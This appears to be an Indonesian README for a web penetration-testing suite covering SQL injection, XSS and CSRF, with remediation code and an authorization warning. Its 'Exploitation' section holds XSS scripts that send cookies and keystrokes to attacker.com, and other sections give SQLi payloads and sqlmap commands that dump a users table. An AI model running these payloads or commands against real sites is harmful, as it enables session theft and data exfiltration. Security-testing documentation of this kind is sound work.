# 🔒 Comprehensive Penetration Testing Framework
## Security Testing Suite untuk Admin Panel

---

## 📋 Daftar Isi
1. [Overview](#overview)
2. [Instalasi](#instalasi)
3. [Tool yang Tersedia](#tool-yang-tersedia)
4. [Cara Penggunaan](#cara-penggunaan)
5. [Interpretasi Hasil](#interpretasi-hasil)
6. [Remediasi](#remediasi)

---

## 🎯 Overview

Framework ini mencakup testing komprehensif untuk:
- ✅ SQL Injection (Error, Blind, Time-based, Union-based)
- ✅ XSS (Reflected, Stored, DOM-based)
- ✅ CSRF (Cross-Site Request Forgery)
- ✅ File Upload Vulnerabilities
- ✅ API Security
- ✅ Authentication & Authorization
- ✅ Business Logic Flaws
- ✅ Information Disclosure
- ✅ Security Headers

---

## ⚙️ Instalasi

### 1. Install Dependencies

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install Python tools
sudo apt install -y python3 python3-pip

# Install required Python libraries
pip3 install requests beautifulsoup4 urllib3

# Install optional security tools
sudo apt install -y nikto dirb gobuster sqlmap nmap
```

### 2. Download Scripts

```bash
# Make scripts executable
chmod +x pentest_comprehensive.py
chmod +x advanced_sqli_test.py
chmod +x advanced_xss_scanner.py
chmod +x csrf_tester.py
```

---

## 🛠️ Tool yang Tersedia

### 1. **pentest_comprehensive.py**
**Comprehensive Penetration Testing Tool**

**Fitur:**
- Automated crawling dan testing
- SQL Injection detection
- XSS vulnerability scanning
- CSRF testing
- File upload security
- API security assessment
- Business logic flaw detection
- Information disclosure testing
- Security headers analysis
- Automatic HTML report generation

**Usage:**
```bash
python3 pentest_comprehensive.py <target_url>

# Example:
python3 pentest_comprehensive.py http://localhost:8080/admin
python3 pentest_comprehensive.py https://192.168.1.100
```

**Output:**
- `pentest_report.json` - JSON report
- `pentest_report.html` - HTML report dengan visualisasi

---

### 2. **advanced_sqli_test.py**
**Advanced SQL Injection Testing Tool**

**Fitur:**
- Error-based SQL Injection
- Boolean-based Blind SQL Injection
- Time-based Blind SQL Injection
- Union-based SQL Injection
- Multi-database support (MySQL, PostgreSQL, MSSQL, Oracle)

**Usage:**
```bash
python3 advanced_sqli_test.py '<url_with_parameters>'

# Example:
python3 advanced_sqli_test.py 'http://localhost/user.php?id=1'
python3 advanced_sqli_test.py 'http://localhost/search.php?q=test&category=1'
```

**Testing Techniques:**
```bash
# Test Error-based SQLi
# Payload: ' OR '1'='1

# Test Time-based SQLi
# Payload: ' AND SLEEP(5)--

# Test Union-based SQLi
# Payload: ' UNION SELECT NULL,NULL--
```

---

### 3. **advanced_xss_scanner.py**
**Advanced XSS Vulnerability Scanner**

**Fitur:**
- Reflected XSS detection
- Stored XSS target identification
- DOM-based XSS analysis
- Content Security Policy (CSP) testing
- WAF bypass techniques
- 50+ XSS payloads including polyglots

**Usage:**
```bash
python3 advanced_xss_scanner.py '<target_url>'

# Example dengan parameter:
python3 advanced_xss_scanner.py 'http://localhost/search.php?q=test'

# Example tanpa parameter:
python3 advanced_xss_scanner.py 'http://localhost/comments.php'
```

**Payload Types:**
- Basic: `<script>alert('XSS')</script>`
- Event handlers: `<img src=x onerror=alert('XSS')>`
- Filter bypass: `<<script>script>alert('XSS')<</script>/script>`
- WAF bypass: Encoded, Unicode, null bytes

---

### 4. **csrf_tester.py**
**CSRF Testing & PoC Generator**

**Fitur:**
- CSRF token detection
- Token validation testing
- SameSite cookie attribute testing
- Automatic PoC generation (HTML & AJAX)
- Sensitive operation detection

**Usage:**
```bash
python3 csrf_tester.py <target_url>

# Example:
python3 csrf_tester.py http://localhost/admin/profile.php
python3 csrf_tester.py http://localhost/user/change-password.php
```

**Output:**
- `csrf_poc_form_1.html` - HTML form-based PoC
- `csrf_poc_ajax_form_1.html` - AJAX-based PoC

---

## 📊 Cara Penggunaan

### Skenario 1: Complete Scan (Recommended)

```bash
# 1. Run comprehensive scan
python3 pentest_comprehensive.py http://localhost:8080

# 2. Review report
firefox pentest_report.html

# 3. Deep dive specific vulnerabilities
python3 advanced_sqli_test.py 'http://localhost:8080/user.php?id=1'
python3 advanced_xss_scanner.py 'http://localhost:8080/search.php?q=test'
python3 csrf_tester.py http://localhost:8080/admin/profile.php
```

### Skenario 2: Targeted Testing

```bash
# Test hanya SQL Injection
python3 advanced_sqli_test.py 'http://localhost/products.php?id=5'

# Test hanya XSS
python3 advanced_xss_scanner.py 'http://localhost/comments.php?comment=test'

# Test hanya CSRF
python3 csrf_tester.py http://localhost/admin/settings.php
```

### Skenario 3: Automated + Manual Testing

```bash
# 1. Automated scan untuk overview
python3 pentest_comprehensive.py http://localhost

# 2. Identifikasi vulnerability dari report
cat pentest_report.json | grep CRITICAL

# 3. Manual exploitation menggunakan specialized tools
python3 advanced_sqli_test.py '<url_dari_critical_finding>'
```

---

## 🔍 Interpretasi Hasil

### Severity Levels

| Severity | Description | Example |
|----------|-------------|---------|
| **CRITICAL** | Immediate exploitation possible, high impact | SQL Injection with data extraction |
| **HIGH** | Serious vulnerability, requires urgent fix | Reflected XSS in authentication page |
| **MEDIUM** | Moderate risk, should be fixed soon | Missing security headers |
| **LOW** | Minor issue, fix when possible | Information disclosure in error messages |
| **INFO** | Informational, no immediate risk | Login form detected |

### SQL Injection Results

```json
{
  "type": "SQL Injection - Error Based",
  "severity": "CRITICAL",
  "url": "http://localhost/user.php?id=1",
  "payload": "' OR '1'='1",
  "proof": "MySQL syntax error detected"
}
```

**Interpretasi:**
- ✅ Vulnerability confirmed
- 🎯 Parameter `id` is injectable
- 💀 Data dapat diextract menggunakan tools seperti sqlmap

**Next Steps:**
```bash
# Exploit menggunakan sqlmap
sqlmap -u "http://localhost/user.php?id=1" --dbs
sqlmap -u "http://localhost/user.php?id=1" -D database_name --tables
sqlmap -u "http://localhost/user.php?id=1" -D database_name -T users --dump
```

### XSS Results

```json
{
  "type": "XSS - Reflected in Script Tag",
  "severity": "CRITICAL",
  "parameter": "search",
  "payload": "<script>alert('XSS')</script>",
  "context": "Inside <script> tag"
}
```

**Interpretasi:**
- ✅ XSS vulnerability confirmed
- 🎯 Payload reflected without sanitization
- 💀 Session hijacking possible

**Exploitation:**
```javascript
// Steal cookies
<script>
document.location='http://attacker.com/steal.php?c='+document.cookie;
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  fetch('http://attacker.com/log.php?key='+e.key);
}
</script>
```

### CSRF Results

```bash
[!] VULNERABLE - No CSRF protection
[!] Severity: CRITICAL
[!] Sensitive operation detected!
[+] PoC saved to: csrf_poc_form_1.html
```

**Interpretasi:**
- ✅ CSRF vulnerability confirmed
- 🎯 Sensitive operation (password change/delete) unprotected
- 💀 Account takeover possible

**Testing PoC:**
1. Open `csrf_poc_form_1.html` di browser
2. Pastikan user sudah login di tab lain
3. PoC akan auto-submit
4. Verifikasi action berhasil dilakukan

---

## 🛡️ Remediasi

### SQL Injection Fix

**Vulnerable Code (PHP):**
```php
// VULNERABLE
$id = $_GET['id'];
$query = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $query);
```

**Fixed Code:**
```php
// SECURE - Using Prepared Statements
$id = $_GET['id'];
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
$result = $stmt->get_result();
```

**Python (Django):**
```python
# VULNERABLE
User.objects.raw(f"SELECT * FROM users WHERE id = {user_id}")

# SECURE
User.objects.filter(id=user_id)  # ORM handles parameterization
```

---

### XSS Fix

**Vulnerable Code (PHP):**
```php
// VULNERABLE
echo "Search results for: " . $_GET['search'];
```

**Fixed Code:**
```php
// SECURE
echo "Search results for: " . htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
```

**JavaScript:**
```javascript
// VULNERABLE
element.innerHTML = userInput;

// SECURE
element.textContent = userInput;
// or
element.innerHTML = DOMPurify.sanitize(userInput);
```

**Content Security Policy Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

---

### CSRF Fix

**Add CSRF Token (PHP):**
```php
// Generate token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// In form
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">

// Validate
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

**SameSite Cookie:**
```php
// Set cookie with SameSite attribute
setcookie('session', $value, [
    'samesite' => 'Strict',
    'secure' => true,
    'httponly' => true
]);
```

**Django:**
```python
# In templates
{% csrf_token %}

# Automatic validation in views
```

---

### File Upload Fix

**Vulnerable Code:**
```php
// VULNERABLE
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $_FILES['file']['name']);
```

**Fixed Code:**
```php
// SECURE
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die('Invalid file type');
}

// Validate MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

if (!in_array($mime, $allowed_mimes)) {
    die('Invalid file content');
}

// Generate random filename
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;
move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $new_filename);
```

---

### Security Headers

**Add to .htaccess (Apache):**
```apache
# X-Frame-Options
Header always set X-Frame-Options "SAMEORIGIN"

# X-Content-Type-Options
Header always set X-Content-Type-Options "nosniff"

# X-XSS-Protection
Header always set X-XSS-Protection "1; mode=block"

# Strict-Transport-Security
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"

# Content-Security-Policy
Header always set Content-Security-Policy "default-src 'self'; script-src 'self'"

# Referrer-Policy
Header always set Referrer-Policy "strict-origin-when-cross-origin"
```

**PHP:**
```php
header("X-Frame-Options: SAMEORIGIN");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
header("Content-Security-Policy: default-src 'self'");
```

---

## 📈 Testing Workflow

```
1. RECONNAISSANCE
   ├── Run comprehensive scan
   ├── Review all findings
   └── Prioritize by severity

2. DEEP DIVE
   ├── Test CRITICAL findings manually
   ├── Use specialized tools
   └── Document exploitation steps

3. VERIFICATION
   ├── Confirm vulnerabilities
   ├── Test different scenarios
   └── Document impact

4. REPORTING
   ├── Generate final report
   ├── Include PoC
   └── Provide remediation steps

5. REMEDIATION
   ├── Fix vulnerabilities
   ├── Re-test
   └── Verify fixes
```

---

## ⚠️ Important Notes

1. **Legal Authorization**
   - ALWAYS get written permission before testing
   - Test only on your own systems or with explicit authorization
   - Unauthorized testing is illegal

2. **Test Environment**
   - Use staging/development environment
   - Don't test on production without approval
   - Backup data before testing

3. **Responsible Disclosure**
   - If you find vulnerabilities in third-party systems
   - Report to security team immediately
   - Don't publicly disclose until fixed

4. **Tool Limitations**
   - Automated tools can have false positives
   - Manual verification is required
   - Not all vulnerabilities can be detected automatically

---

## 📚 Additional Resources

**Learning:**
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- HackerOne: https://www.hackerone.com/

**Tools:**
- Burp Suite: https://portswigger.net/burp
- OWASP ZAP: https://www.zaproxy.org/
- SQLMap: https://sqlmap.org/

**Standards:**
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PTES: http://www.pentest-standard.org/

---

## 🆘 Support

Jika menemukan bug atau memerlukan bantuan:
1. Review documentation ini
2. Check OWASP resources
3. Konsultasi dengan security expert

---

**⚠️ DISCLAIMER:**
Tools ini untuk educational dan authorized security testing only.
Penyalahgunaan untuk aktivitas ilegal adalah tanggung jawab user.

---

## ✅ Checklist Setelah Testing

- [ ] Semua CRITICAL vulnerabilities telah difix
- [ ] HIGH severity issues telah ditangani
- [ ] Security headers telah ditambahkan
- [ ] Input validation telah diimplementasikan
- [ ] CSRF protection aktif di semua forms
- [ ] File upload telah di-restrict
- [ ] Error messages tidak leak information
- [ ] Session management aman
- [ ] Re-test untuk verifikasi fixes
- [ ] Documentation updated

---

**Happy Secure Coding! 🔒**
